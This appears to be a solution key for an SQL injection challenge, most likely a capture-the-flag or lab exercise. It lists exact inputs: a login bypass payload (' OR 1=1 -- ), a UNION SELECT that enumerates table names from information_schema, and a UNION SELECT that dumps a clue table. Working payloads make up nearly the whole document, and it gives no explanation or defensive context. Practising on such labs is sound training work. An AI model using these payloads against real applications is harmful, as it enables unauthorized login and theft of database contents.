# SQL injection challenge

## Login
**Username:** `admin`  
**Password:** `' OR 1=1 -- ` (include the space at the end)

## Search Box -- Get table names
**Search Input:** `' UNION ALL SELECT table_name, 1, 1 FROM information_schema.tables WHERE table_schema=database() -- ` (include the space at the end)

## Search Box -- Get Challenge Clue
**Search Input:** `' UNION ALL SELECT *, 1 FROM challenge_clue -- ` (include the space at the end)
